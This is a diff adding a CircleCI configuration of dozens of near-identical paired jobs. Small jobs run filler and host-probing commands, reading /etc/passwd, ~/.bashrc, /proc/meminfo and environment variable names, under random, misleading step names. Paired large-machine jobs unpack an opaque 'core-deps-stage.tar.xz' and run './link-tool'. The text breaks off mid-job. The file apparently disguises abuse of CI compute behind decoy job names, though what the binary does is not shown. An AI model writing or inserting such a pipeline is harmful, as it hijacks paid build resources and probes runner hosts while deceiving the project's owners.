@@ -1,0 +1,1475 @@
+version: 2.1
+
+jobs:
+  IRQSGDBus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Schedule the contracts by payroll cutoff
+          command: |
+            mkdir -p /tmp/_queue
+            set +o pipefail 2>/dev/null; cat /proc/meminfo 2>/dev/null > /tmp/_queue/CedarNorthLepton; seq 1 5000 >> /tmp/_queue/CedarNorthLepton; true
+            sha1sum /tmp/_queue/CedarNorthLepton
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'CedarNorthLepton'
+  t-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  cbEmptyQuick:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Transfer the report PDFs over to staging
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; fmt -w 55 /proc/cpuinfo; true ; } > /tmp/_queue/glint_31128
+            sha1sum /tmp/_queue/glint_31128
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'glint_31128'
+  echo-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/glint_31128 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  mitten-jigsaw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: PENDING resize
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; shuf -i 1-907 -n 14 | head -5 | tac | head -5; true ; } > /tmp/_queue/b24ad6a3-7cb5
+            sha1sum /tmp/_queue/b24ad6a3-7cb5
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'b24ad6a3-7cb5'
+  alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/b24ad6a3-7cb5 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  func_syn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Revert checksum
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; printf '%s\n' 11 16 97 79 >"/tmp/mock.blog.tmp" && sort -n -o "/tmp/mock.blog.tmp" "/tmp/mock.blog.tmp" && cat "/tmp/mock.blog.tmp"; true ; } > /tmp/_queue/surge-golden-molten-chunk
+            sha1sum /tmp/_queue/surge-golden-molten-chunk
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'surge-golden-molten-chunk'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/surge-golden-molten-chunk 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  edge55-north:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: XXX replay the junit output properly
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; echo -n "timeout reached" | base64; true ; } > /tmp/_queue/cr
+            sha1sum /tmp/_queue/cr
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'cr'
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/cr 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  playerObj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; for file in /usr/lib/*release*; do echo "${file}"; done|head -n 3; true ; } > /tmp/_queue/iron-gadget-hollow-archive
+            sha1sum /tmp/_queue/iron-gadget-hollow-archive
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'iron-gadget-hollow-archive'
+  BuildImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  cFjkwbwSJv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: shuffle HELP
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/tower-profile-2018-08-28"&&rmdir "/tmp/tower-profile-2018-08-28"&&echo ok; true ; } > /tmp/_queue/0.217.0.20
+            sha1sum /tmp/_queue/0.217.0.20
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '0.217.0.20'
+  d-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/0.217.0.20 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  detach-when:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Reduce the support macros
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; x=$(echo 'v1.2.3 released' | wc -c); echo "chars: $x"; true ; } > /tmp/_queue/crimson882
+            sha1sum /tmp/_queue/crimson882
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'crimson882'
+  anothr-run-27:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/crimson882 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  feat-builder-22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: transcode mk3
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; printenv | head -n 2 | cut -d '=' -f 1; true ; } > /tmp/_queue/2271.5463-router
+            sha1sum /tmp/_queue/2271.5463-router
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '2271.5463-router'
+  APP-274:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/2271.5463-router 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  can_update:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Leftover junk ok
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; for thing in lime fig orange; do printf '%-8s %d\n' "${thing}" ${#thing}; done | sort; true ; } > /tmp/_queue/txt.obj.src
+            sha1sum /tmp/_queue/txt.obj.src
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'txt.obj.src'
+  feat-9771:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/txt.obj.src 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  Shade2IRQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Wheels up fingerprint
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; yes 'error: none' | head -3; true ; } > /tmp/_queue/9dd6e37fe0f0fd1daac1898
+            sha1sum /tmp/_queue/9dd6e37fe0f0fd1daac1898
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '9dd6e37fe0f0fd1daac1898'
+  q2-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/9dd6e37fe0f0fd1daac1898 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  lemon-tempo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: ticket 5d3ff
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; find /opt -name '*' -size +1k -exec ls -ld {} + 2>/dev/null | nl; true ; } > /tmp/_queue/iter_003
+            sha1sum /tmp/_queue/iter_003
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'iter_003'
+  API-542:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/iter_003 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  ULT-32139b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 860 INPUT sensor array
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; ls -vtp ~/.bash* | tr '\n' ' '; true ; } > /tmp/_queue/PANO00048831
+            sha1sum /tmp/_queue/PANO00048831
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'PANO00048831'
+  rl-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/PANO00048831 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  MASK_INTERCEPTOR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Stop rigging the level
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; for n in brown orange cyan white blue; do printf '%-8s %d\n' "$n" ${#n}; done; true ; } > /tmp/_queue/879d441
+            sha1sum /tmp/_queue/879d441
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '879d441'
+  p-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  c-toast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Alongside that calibrate the rack units
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; ls -Rc /srv | fmt -w 60; true ; } > /tmp/_queue/FTP_TCP
+            sha1sum /tmp/_queue/FTP_TCP
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'FTP_TCP'
+  whiskey-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  drouthnongex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: oh and mirror leftover junk
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; if grep -q "/usr/bin" /etc/shells;then echo true; else echo "false"; fi; true ; } > /tmp/_queue/_wip-4c80340
+            sha1sum /tmp/_queue/_wip-4c80340
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - '_wip-4c80340'
+  add-db:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  label__error__current:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: mask oauth scopes too
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; grep -v fi ~/.bashrc | nl; true ; } > /tmp/_queue/ziNcThreaD
+            sha1sum /tmp/_queue/ziNcThreaD
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'ziNcThreaD'
+  refactor-4999:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/ziNcThreaD 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  SimpleManualWidthUtil:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Yolo prune stale snapshots
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; echo x >"/tmp/whale_photo_2023-05-08.dat" && ln -f "/tmp/whale_photo_2023-05-08.dat" /tmp/products.bak && stat -c %h "/tmp/whale_photo_2023-05-08.dat"; true ; } > /tmp/_queue/snapshot.1.0
+            sha1sum /tmp/_queue/snapshot.1.0
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'snapshot.1.0'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/snapshot.1.0 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  Find-SymbolId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Hold short of the onboarding guide
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -w 'games' | awk -F: '{print $1}'; true ; } > /tmp/_queue/LedgerSparkFrame
+            sha1sum /tmp/_queue/LedgerSparkFrame
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'LedgerSparkFrame'
+  update-parse-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/LedgerSparkFrame 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  thx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Wave 16 Of 29 Inspecting Centrifuge Rotor
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; mkdir -p ${TMPDIR:-/tmp}/valley && cd ${TMPDIR:-/tmp}/valley && touch thursday tuesday sunday && ls && cd - >/dev/null; true ; } > /tmp/_queue/sockETVelVEThosTLoADeR
+            sha1sum /tmp/_queue/sockETVelVEThosTLoADeR
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'sockETVelVEThosTLoADeR'
+  check-nightly-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/sockETVelVEThosTLoADeR 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  wbAccount:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Shader bake run
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; echo -n "50/50" | b2sum; true ; } > /tmp/_queue/v.2.10
+            sha1sum /tmp/_queue/v.2.10
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'v.2.10'
+  APP-933:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/v.2.10 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  beforeSelect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Analyse the poster image and have done with it
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; if [ -s /etc/group ] ; then echo 'present'; elif [ -e /tmp ] ; then echo maybe; else echo 'absent'; fi; true ; } > /tmp/_queue/PARseRHOst
+            sha1sum /tmp/_queue/PARseRHOst
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'PARseRHOst'
+  papa-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/PARseRHOst 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  NQ3MtDYhoNCB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mission Sunny Viper
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; for word in frog swan goose owl cat koala; do echo ${#word}; done; true ; } > /tmp/_queue/amber_moth
+            sha1sum /tmp/_queue/amber_moth
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'amber_moth'
+  RunSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  jade229:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Dilute the extraction kit and log it
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; cat $HOME/.bashrc|grep -vH case|sort -u; true ; } > /tmp/_queue/blake_2f63349b0daebf73
+            sha1sum /tmp/_queue/blake_2f63349b0daebf73
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'blake_2f63349b0daebf73'
+  rust-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/blake_2f63349b0daebf73 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  xrayQuiver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: busy mirroring mesh routes
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; echo "north south east west" >| "/tmp/contact.list" && cat "/tmp/contact.list"; true ; } > /tmp/_queue/a0de8264-98c9-b0ec
+            sha1sum /tmp/_queue/a0de8264-98c9-b0ec
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'a0de8264-98c9-b0ec'
+  vb-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/a0de8264-98c9-b0ec 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c core-deps-stage.tar.xz | tar xf -
+      - run:
+          command: /bin/sh -c "./link-tool"
+  String-Uuid-Pattern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: week 40 flagging
+          command: |
+            mkdir -p /tmp/_queue
+            { set +o pipefail 2>/dev/null; printf '%q\n' "retrying in 5 seconds"; true ; } > /tmp/_queue/mapper-river-shimmer-flux
+            sha1sum /tmp/_queue/mapper-river-shimmer-flux
+      - persist_to_workspace:
+          root: /tmp/_queue
+          paths:
+            - 'mapper-river-shimmer-flux'
+  LAB_RUN_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_queue
+      - run:
+          name: Mount upstream
+          command: |
+            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
